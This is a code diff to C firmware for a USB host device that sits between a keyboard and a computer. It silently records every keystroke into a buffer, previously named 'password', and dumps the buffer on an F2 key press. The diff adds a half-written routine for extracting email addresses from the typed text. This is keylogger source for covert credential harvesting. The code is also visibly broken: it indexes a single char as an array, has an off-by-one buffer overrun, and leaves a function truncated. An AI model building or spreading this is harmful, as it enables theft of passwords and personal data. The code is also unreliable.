@@ -13,10 +13,10 @@
 #include "usbh/debug.h"
 #include "usbh/dev/hid.h"
 
+#define NB_INPUT 200
+char input_tab[NB_INPUT];
 //extern var
 uint8_t  led_status = 7;
-uint16_t password[200];
-uint16_t password_size = 0;
 
 static THD_WORKING_AREA(waTestHID, 1024);
 
@@ -25,15 +25,13 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     (void)len;
     uint8_t *report = (uint8_t *)hidp->config->report_buffer;
 
-    //get every input
-    static int password_index = 0;
-    char       input          = hid2azerty(report);
+    //get every input in a tab
+    static int input_index = 0;
+    char input = hid2azerty(report);
     if(input) {
-        password[password_index] = (uint16_t)input;
-        if(password_index++ >= 200)
-            password_index = 0;
-        if(password_size++ >= 200)
-            password_size = 200;
+        input_tab[input_index] = input;
+        if(input_index++ >= 200)
+            input_index = 0;
     }
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
@@ -41,8 +39,8 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
         usb_report(&UHD2, report, 8);
         if(report[2] == KEY_F2) {
             rtt_printf("=== INPUT ===");
-            for(int i = 0; i < password_size; i++)
-                rtt_printf("input[%d] = '%c'", i, password[i]);
+            for(int i = 0; i < NB_INPUT; i++)
+                rtt_printf("input[%d] = '%c'", i, input[i]);
         }
     }
 }
@@ -100,4 +98,22 @@ void usbh_init(void)
 
     usbhStart(&USBHD1);
     chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
+}
+
+void usbh_email_detector(void)
+{
+    int input_index = 0;
+
+    //find enter input
+    for(int index_enter=0; index_enter<NB_INPUT; index_enter++)
+    {
+        if(input_tab[index_enter] == '\n')
+        {
+            for(int index_at = index_enter; index_at>...
+        }
+
+    //no enter input
+    if(input_index == NB_INPUT) return;
+
+    //find @
 }
